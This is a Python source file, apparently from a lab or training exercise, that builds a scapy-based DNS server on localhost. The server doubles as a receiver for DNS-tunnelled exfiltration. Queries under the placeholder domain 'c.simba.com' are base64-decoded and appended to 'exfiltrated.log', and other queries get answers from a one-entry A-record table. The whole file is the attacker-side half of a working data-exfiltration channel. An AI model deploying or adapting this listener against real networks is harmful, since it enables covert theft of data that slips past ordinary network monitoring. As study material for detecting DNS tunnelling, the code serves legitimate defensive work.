import base64
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP

DNS_FILTER = "udp and port 53"
SERVER_IP = "127.0.0.1"
SERVER_PORT = 53
TTL = 5

DNS_DATABASE = {
    "A": {
        "a.simba.com": "5.5.5.5"
    }
}
EXFIL_REGEX = re.compile(r".*\.c\.simba\.com\.")

SUPPORTED_TYPES = {
    1: "A"
}

OK = 0
NO_SUCH_NAME = 3
NOT_IMPLEMENTED = 4

STORAGE = "exfiltrated.log"
EXFIL_SUFFIX = ".c.simba.com"


def filter_dns_pkt(pkt):
    return (UDP in pkt and DNS in pkt and DNSQR in pkt and pkt[UDP].dport == 53 and pkt[IP].dst == "127.0.0.1")


def write_output(hostname):
    print("[-] Receiving exfiltrated data...\n")
    encoded = hostname.split(EXFIL_SUFFIX)[0]
    decoded = base64.urlsafe_b64decode(encoded)
    with open(STORAGE, "ab") as out_file:
        out_file.write(decoded)


def reply_dns(request):
    if request[DNS].qdcount == 0:
        return

    name = request[DNSQR][0].qname.decode()
    typeid = request[DNSQR][0].qtype

    an = None

    if EXFIL_REGEX.match(name):
        write_output(name)
        return

    if typeid in SUPPORTED_TYPES:
        reqtype = SUPPORTED_TYPES[typeid]

        if name in DNS_DATABASE[reqtype]:
            rcode = OK
            answer = DNS_DATABASE[reqtype][name]
            an = DNSRR(type=reqtype, rrname=name, rdata=answer)

        else:
            rcode = NO_SUCH_NAME
            answer = "NO SUCH NAME"

    else:
        rcode = NOT_IMPLEMENTED
        answer = "NOT IMPLEMENTED"

    print("From: {}\tQuestion: {}\tAnswer: {}".format(request[IP].src, name, answer))

    response = IP(src=request[IP].dst, dst=request[IP].src) / UDP(sport=request[UDP].dport, dport=request[UDP].sport) / \
               DNS(qr=1, id=request[DNS].id, rcode=rcode, an=an)

    send(response, verbose=False)


def start_dns_server():
    print("[+] Starting DNS server on {}:{}...".format(SERVER_IP, SERVER_PORT))
    sniff(lfilter=filter_dns_pkt, prn=reply_dns)


def main():
    start_dns_server()


if __name__ == "__main__":
    main()
